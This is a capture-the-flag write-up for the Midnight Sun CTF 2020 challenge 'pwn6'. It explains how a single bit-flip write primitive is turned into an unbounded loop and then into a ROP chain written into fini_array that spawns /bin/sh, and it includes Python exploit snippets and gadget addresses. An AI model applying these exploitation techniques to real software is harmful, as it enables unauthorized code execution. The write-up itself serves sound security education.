
## pwn6 (135pt)
### Description

> An homage to pwny.racing, we present... speedrun pwn challenges.
> These bite-sized challenges should serve as a nice warm-up for your pwning skills.


### Attachment

[pwn6](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MidnightsunCTF2020/pwn/pwn6/pwn6)

### Analysis

an warming up task of  `fini_array` attack. 64-bit ELF, statically linked and no PIE.

#### Overview

`main` function:

```c
__int64 sub_400C22(){
  sub_4107D0(off_6D57A8, 0LL, 2LL, 0LL); // setvbuf 
  sub_4107D0(off_6D57A0, 0LL, 2LL, 0LL); // setvbuf
  sub_449280(60LL);  // alarm
  sub_400B6D();  // banner
  sub_400B7E();  // write-what-where
  return 0LL;
}
```

part of `sub_400B7E` function:

```c
while ( dword_6D7330 <= 0 ){
    sub_40F780((unsigned __int64)"\x1B[1maddr:\x1B[m ");
    a2 = "%p:%u";
    a1 = off_6D57A8;
    sub_40F900((__int64)off_6D57A8, (__int64)"%p:%u", &v7, &v6); // scanf
    if ( v6 > 7 )
        break;
    *v7 ^= 1LL << v6;  // modify one byte 
    ++dword_6D7330;
}
```

In `sub_400B7E` we can modify one byte of target address by XOR :`*v7 ^= 1LL << v6;`.

But in this function, only one time can we modify, so we need to modify `dword_6D7330`(the variable that control the loop) firstly. 

We can modify one byte to any value by xor for many times, here is the helper function:

```python
def modify(addr,data):
    for i in range(8*8):
        if data&(1<<i):
            payload = "%s:%d"%(hex(addr+i/8),i%8)
            sla('\x1B[1maddr:\x1B[m ',payload)
```

### Solution

#### infinite loop 

modify `0x6D7330` with `0x80000000`, then `dword_6D7330` will become a negative number:

```python
modify(0x6D7330,0x80000000)
```

#### modify fini array

function in `fini_array` would be executed after main, so we can modify them to hijack rip.

```python
# gadget
prdi = 0x004006a6 # pop rdi ; ret
prsi = 0x00410433
prdx = 0x00449af5
prax = 0x0045fdf4
syscall = 0x00449285
leave = 0x00400c20

# elf, libc
fini_array = 0x6d2150
raw = [0x0000000000400b00,   # 0 -> leave 
       0x0000000000400590,   # 1 -- nop
       0x0000000d00000002,   # 2 -> prdi
       0x00000000004ada80,   # 3 -> 0x6d21a8 -> /bin/sh
       0x00000000004ada60,   # 4 -> prsi
       0x0000000000000000,   # 5 -- 0 
       0x00000000006d44c0,   # 6 -> prdx
       0x0000000000000001,   # 7 -> 0
       0x00000000006d4440,   # 8 -> prax
       0x0000000000000001,   # 9 -> 0x3b
       0x00000000004b2680,   # 10-> syscall
       0x00000000004b25a0,   # 11-> /bin/sh
       ]

ropchain = [leave,
            0x0000000000400590,
            prdi,
            0x6d21a8, 
            prsi,
            0,
            prdx,
            0,
            prax,
            0x3b,
            syscall,
            u64('/bin/sh\0')]

for i in range(len(ropchain)):
    modify(fini_array+8*i,raw[i]^ropchain[i])
```

finally,  `SYS_execve('/bin/sh',0,0)` was executed

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/MidnightsunCTF2020/pwn/pwn1) 

see more about `fini_array` attack: [ROP-with-fini-array](http://taqini.space/2020/02/14/play-ROP-with-fini-array/)